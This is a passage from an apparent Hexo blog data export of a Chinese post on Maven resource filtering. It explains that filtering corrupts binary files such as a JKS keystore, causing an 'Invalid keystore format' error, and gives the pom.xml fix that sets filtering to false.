org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:48)\n\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:113)\n\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:125)\n\tat com.yoochatting.market.v5.service.impl.PayServiceImpl.checkPayGuangda(PayServiceImpl.groovy:680)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n\tat java.lang.reflect.Method.invoke(Method.java:498)\n\tat org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:317)\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:190)\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:157)\n\tat org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:99)\n\tat org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:281)\n\tat org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:96)\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:179)\n\tat org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:92)\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:179)\n\tat org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:207)\n\tat com.sun.proxy.$Proxy92.checkPayGuangda(Unknown Source)\n\tat com.yoochatting.market.v5.service.PayService$checkPayGuangda.call(Unknown Source)\n\tat org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:48)\n\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:113)\n\tat com.yoochatting.market.ctrl.AndroidBuyerbV5Controller.guangdaPayOrder(AndroidBuyerbV5Controller.groovy:618)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n\tat java.lang.reflect.Method.invoke(Method.java:498)\n\tat org.springframework.web.bind.annotation.support.HandlerMethodInvoker.invokeHandlerMethod(HandlerMethodInvoker.java:177)\n\tat org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.invokeHandlerMethod(AnnotationMethodHandlerAdapter.java:446)\n\tat org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.handle(AnnotationMethodHandlerAdapter.java:434)\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:943)\n\tat org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:877)\n\tat org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:966)\n\tat org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:857)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:624)\n\tat org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:842)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:731)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\n\tat org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\n\tat org.tuckey.web.filters.urlrewrite.RuleChain.handleRewrite(RuleChain.java:176)\n\tat org.tuckey.web.filters.urlrewrite.RuleChain.doRules(RuleChain.java:145)\n\tat org.tuckey.web.filters.urlrewrite.UrlRewriter.processRequest(UrlRewriter.java:92)\n\tat org.tuckey.web.filters.urlrewrite.UrlRewriteFilter.doFilter(UrlRewriteFilter.java:394)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\n\tat org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:747)\n\tat org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:485)\n\tat org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:410)\n\tat org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:337)\n\tat org.tuckey.web.filters.urlrewrite.NormalRewrittenUrl.doRewrite(NormalRewrittenUrl.java:213)\n\tat org.tuckey.web.filters.urlrewrite.RuleChain.handleRewrite(RuleChain.java:171)\n\tat org.tuckey.web.filters.urlrewrite.RuleChain.doRules(RuleChain.java:145)\n\tat org.tuckey.web.filters.urlrewrite.UrlRewriter.processRequest(UrlRewriter.java:92)\n\tat org.tuckey.web.filters.urlrewrite.UrlRewriteFilter.doFilter(UrlRewriteFilter.java:394)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\n\tat org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\n\tat org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)\n\tat org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)\n\tat org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:505)\n\tat org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\n\tat org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)\n\tat org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:958)\n\tat org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\n\tat org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:452)\n\tat org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1087)\n\tat org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:637)\n\tat org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.doRun(AprEndpoint.java:2517)\n\tat org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:2506)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\n\tat org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\n\tat java.lang.Thread.run(Thread.java:748)\n```\n\n\n出现该错误，大都是因为maven将resources下文件拷到classes下的时候导致的，当filtering为true时，maven会在拷贝文件过程中进行变量替换，这导致原文件格式发生变化。而对于jks、so等二进制文件，文件内任意的字节变化都有可能导致文件不符合格式规范，所以会出现报错情况。\n\nfiltering参数官方的解释如下\n```\nfiltering: is true or false, denoting if filtering is to be enabled for this resource. Note, that filter *.properties files do not have to be defined for filtering to occur - resources can also use properties that are by default defined in the POM (such as ${project.version}), passed into the command line using the \"-D\" flag (for example, \"-Dname=value\") or are explicitly defined by the properties element. Filter files were covered above.\n```\n意思是，maven会根据`<build><filters> <filter>filters/filter1.properties</filter> </filters></build>`下所定义的变量值、pom文件内默认的诸如`project.version`之类的变量，以及运行命令中-D参数定义的变量，对文件中的${}位置进行变量的替换，该机制在某些情景中应用很有意义，例如：想要在项目中获取pom文件中规定的项目版本号，可以在config.properties中增加一行：`version=${project.version}`，即可使config.properties中的版本号和pom文件保持一致。即使没有匹配的变量，filtering为true时也不可避免的对文件中的某些字节进行了修改。\n\n\n\n解决办法是，如果没有需要变量替换的情况，可以最简单的将filtering设为false，否则需将二进制文件单独定义拷贝，并将filtering参数设置为false：\n```\n<resource>\n\t<directory>${basedir}/src/main/resources</directory>\n\t<includes>\n\t\t<include>abcd.so</include>\n\t</includes>\n\t<filtering>false</filtering>\n</resource>\n```\n在pom文件中指定该文件拷贝规则filtering为false\n\n\n","slug":"maven-filter","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi06z002hg0ukuh6xk7sv","content":"<p>错误信息：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java.io.IOException: Invalid keystore format</span><br><span class=\"line\">\tat sun.security.provider.JavaKeyStore.engineLoad(JavaKeyStore.java:658)</span><br><span class=\"line\">\tat sun.security.provider.JavaKeyStore$JKS.engineLoad(JavaKeyStore.java:56)</span><br><span class=\"line\">\tat sun.security.provider.KeyStoreDelegator.engineLoad(KeyStoreDelegator.java:224)</span><br><span class=\"line\">\tat sun.security.provider.JavaKeyStore$DualFormatJKS.engineLoad(JavaKeyStore.java:70)</span><br><span class=\"line\">\tat java.security.KeyStore.load(KeyStore.java:1445)</span><br><span class=\"line\">\tat com.csii.payment.client.util.Util.getKeyStore(Util.java:446)</span><br><span class=\"line\">\tat com.csii.payment.client.key.KeyManager.getKeyStore(KeyManager.java:185)</span><br><span class=\"line\">\tat com.csii.payment.client.key.KeyManager.initMerchantJKS(KeyManager.java:144)</span><br><span class=\"line\">\tat com.csii.payment.client.key.KeyManager.initJKSInfoUseNewMerchantProperties(KeyManager.java:109)</span><br><span class=\"line\">\tat com.csii.payment.client.key.KeyManager.&lt;clinit&gt;(KeyManager.java:85)</span><br><span class=\"line\">\tat com.csii.payment.client.core.MerchantSignTool.checkSignParam(MerchantSignTool.java:571)</span><br><span class=\"line\">\tat com.csii.payment.client.core.MerchantSignTool.sign(MerchantSignTool.java:89)</span><br><span class=\"line\">\tat com.csii.payment.client.core.MerchantSignTool$sign.call(Unknown Source)</span><br><span class=\"line\">\tat org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:48)</span><br><span class=\"line\">\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:113)</span><br><span class=\"line\">\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:125)</span><br><span class=\"line\">\tat com.yoochatting.market.v5.service.impl.PayServiceImpl.checkPayGuangda(PayServiceImpl.groovy:680)</span><br><span class=\"line\">\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class=\"line\">\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class=\"line\">\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class=\"line\">\tat java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class=\"line\">\tat org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:317)</span><br><span class=\"line\">\tat org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:190)</span><br><span class=\"line\">\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:157)</span><br><span class=\"line\">\tat org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:99)</span><br><span class=\"line\">\tat org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:281)</span><br><span class=\"line\">\tat org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:96)</span><br><span class=\"line\">\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:179)</span><br><span class=\"line\">\tat org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:92)</span><br><span class=\"line\">\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:179)</span><br><span class=\"line\">\tat org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:207)</span><br><span class=\"line\">\tat com.sun.proxy.$Proxy92.checkPayGuangda(Unknown Source)</span><br><span class=\"line\">\tat com.yoochatting.market.v5.service.PayService$checkPayGuangda.call(Unknown Source)</span><br><span class=\"line\">\tat org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:48)</span><br><span class=\"line\">\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:113)</span><br><span class=\"line\">\tat com.yoochatting.market.ctrl.AndroidBuyerbV5Controller.guangdaPayOrder(AndroidBuyerbV5Controller.groovy:618)</span><br><span class=\"line\">\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class=\"line\">\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class=\"line\">\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class=\"line\">\tat java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class=\"line\">\tat org.springframework.web.bind.annotation.support.HandlerMethodInvoker.invokeHandlerMethod(HandlerMethodInvoker.java:177)</span><br><span class=\"line\">\tat org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.invokeHandlerMethod(AnnotationMethodHandlerAdapter.java:446)</span><br><span class=\"line\">\tat org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.handle(AnnotationMethodHandlerAdapter.java:434)</span><br><span class=\"line\">\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:943)</span><br><span class=\"line\">\tat org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:877)</span><br><span class=\"line\">\tat org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:966)</span><br><span class=\"line\">\tat org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:857)</span><br><span class=\"line\">\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:624)</span><br><span class=\"line\">\tat org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:842)</span><br><span class=\"line\">\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:731)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)</span><br><span class=\"line\">\tat org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.RuleChain.handleRewrite(RuleChain.java:176)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.RuleChain.doRules(RuleChain.java:145)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.UrlRewriter.processRequest(UrlRewriter.java:92)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.UrlRewriteFilter.doFilter(UrlRewriteFilter.java:394)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:747)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:485)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:410)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:337)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.NormalRewrittenUrl.doRewrite(NormalRewrittenUrl.java:213)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.RuleChain.handleRewrite(RuleChain.java:171)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.RuleChain.doRules(RuleChain.java:145)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.UrlRewriter.processRequest(UrlRewriter.java:92)</span><br><span class=\"line\">\tat org.tuckey.web.filters.urlrewrite.UrlRewriteFilter.doFilter(UrlRewriteFilter.java:394)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)</span><br><span class=\"line\">\tat org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88)</span><br><span class=\"line\">\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)</span><br><span class=\"line\">\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)</span><br><span class=\"line\">\tat org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)</span><br><span class=\"line\">\tat org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)</span><br><span class=\"line\">\tat org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:505)</span><br><span class=\"line\">\tat org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)</span><br><span class=\"line\">\tat org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)</span><br><span class=\"line\">\tat org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:958)</span><br><span class=\"line\">\tat org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)</span><br><span class=\"line\">\tat org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:452)</span><br><span class=\"line\">\tat org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1087)</span><br><span class=\"line\">\tat org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:637)</span><br><span class=\"line\">\tat org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.doRun(AprEndpoint.java:2517)</span><br><span class=\"line\">\tat org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:2506)</span><br><span class=\"line\">\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)</span><br><span class=\"line\">\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)</span><br><span class=\"line\">\tat org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)</span><br><span class=\"line\">\tat java.lang.Thread.run(Thread.java:748)</span><br></pre></td></tr></table></figure>\n\n<p>出现该错误，大都是因为maven将resources下文件拷到classes下的时候导致的，当filtering为true时，maven会在拷贝文件过程中进行变量替换，这导致原文件格式发生变化。而对于jks、so等二进制文件，文件内任意的字节变化都有可能导致文件不符合格式规范，所以会出现报错情况。</p>\n<p>filtering参数官方的解释如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">filtering: is true or false, denoting if filtering is to be enabled for this resource. Note, that filter *.properties files do not have to be defined for filtering to occur - resources can also use properties that are by default defined in the POM (such as $&#123;project.version&#125;), passed into the command line using the &quot;-D&quot; flag (for example, &quot;-Dname=value&quot;) or are explicitly defined by the properties element. Filter files were covered above.</span><br></pre></td></tr></table></figure>\n\n<p>意思是，maven会根据<code>&lt;build&gt;&lt;filters&gt; &lt;filter&gt;filters/filter1.properties&lt;/filter&gt; &lt;/filters&gt;&lt;/build&gt;</code>下所定义的变量值、pom文件内默认的诸如<code>project.version</code>之类的变量，以及运行命令中-D参数定义的变量，对文件中的${}位置进行变量的替换，该机制在某些情景中应用很有意义，例如：想要在项目中获取pom文件中规定的项目版本号，可以在config.properties中增加一行：<code>version=${project.version}</code>，即可使config.properties中的版本号和pom文件保持一致。即使没有匹配的变量，filtering为true时也不可避免的对文件中的某些字节进行了修改。</p>\n<p>解决办法是，如果没有需要变量替换的情况，可以最简单的将filtering设为false，否则需将二进制文件单独定义拷贝，并将filtering参数设置为false：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;resource&gt;</span><br><span class=\"line\">\t&lt;directory&gt;$&#123;basedir&#125;/src/main/resources&lt;/directory&gt;</span><br><span class=\"line\">\t&lt;includes&gt;</span><br><span class=\"line\">\t\t&lt;include&gt;abcd.so&lt;/include&gt;</span><br><span class=\"line\">\t&lt;/includes&gt;</span><br><span class=\"line\">\t&lt;filtering&gt;false&lt;/filtering&gt;</span><br><span class=\"line\">&lt;/resource&gt;</span><br></pre></td></tr></table></figure>\n\n<p>在pom文件中指定该文件拷贝规则filtering为false</p>\n","site":{"data":{}},"excerpt":"","more":"<p>错误信息：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java.io.IOException: Invalid keystore format</span><br><span class=\"line\">\tat sun.security.provider.JavaKeyStore.engineLoad(JavaKeyStore.java:658)</span><br><span class=\"line\">\tat sun.security.provider.JavaKeyStore$JKS.engineLoad(JavaKeyStore.java:56)</span><br><span class=\"line\">\tat sun.security.provider.KeyStoreDelegator.engineLoad(KeyStoreDelegator.java:224)</span><br><span class=\"line\">\tat sun.security.provider.JavaKeyStore$DualFormatJKS.engineLoad(JavaKeyStore.java:70)</span><br><span class=\"line\">\tat java.security.KeyStore.load(KeyStore.java:1445)</span><br><span class=\"line\">\tat com.csii.payment.client.util.Util.getKeyStore(Util.java:446)</span><br><span class=\"line\">\tat com.csii.payment.client.key.KeyManager.getKeyStore(KeyManager.java:185)</span><br><span class=\"line\">\tat com.csii.payment.client.key.KeyManager.initMerchantJKS(KeyManager.java:144)</span><br><span class=\"line\">\tat com.csii.payment.client.key.KeyManager.initJKSInfoUseNewMerchantProperties(KeyManager.java:109)</span><br><span class=\"line\">\tat com.csii.payment.client.key.KeyManager.&lt;clinit&gt;(KeyManager.java:85)</span><br><span class=\"line\">\tat com.csii.payment.client.core.MerchantSignTool.checkSignParam(MerchantSignTool.java:571)</span><br><span class=\"line\">\tat com.csii.payment.client.core.MerchantSignTool.sign(MerchantSignTool.java:89)</span><br><span class=\"line\">\tat com.csii.payment.client.core.MerchantSignTool$sign.call(Unknown Source)</span><br><span class=\"line\">\tat org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:48)</span><br><span class=\"line\">\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:113)</span><br><span class=\"line\">\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:125)</span><br><span class=\"line\">\tat com.yoochatting.market.v5.service.impl.PayServiceImpl.checkPayGuangda(PayServiceImpl.groovy:680)</span><br><span class=\"line\">\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class=\"line\">\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class=\"line\">\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class=\"line\">\tat 